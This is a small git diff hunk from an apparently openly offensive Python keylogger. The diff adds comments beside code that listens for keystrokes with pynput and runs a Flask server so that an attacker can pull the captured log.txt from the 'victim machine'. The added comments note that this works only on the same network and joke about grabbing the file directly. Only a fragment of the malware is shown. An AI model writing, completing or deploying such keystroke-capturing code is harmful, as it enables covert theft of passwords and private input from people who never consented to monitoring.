@@ -32,7 +32,9 @@ with Listener(on_press=log_keystroke) as k_listener:
 clean_log_file()
 
 
-#Using Flask, you can connect back to the victim machine via your browser to receive the log.txt file containing the captured keystrokes.
+#Using Flask, you can connect back to the victim machine via your browser to receive the log.txt file containing the captured keystrokes.This only works if the victim machine is on the same network you are on. 
+#May as well just get the log.txt file from the system itself lol
+
 app = Flask(__name__)
 
 @app.route('/')
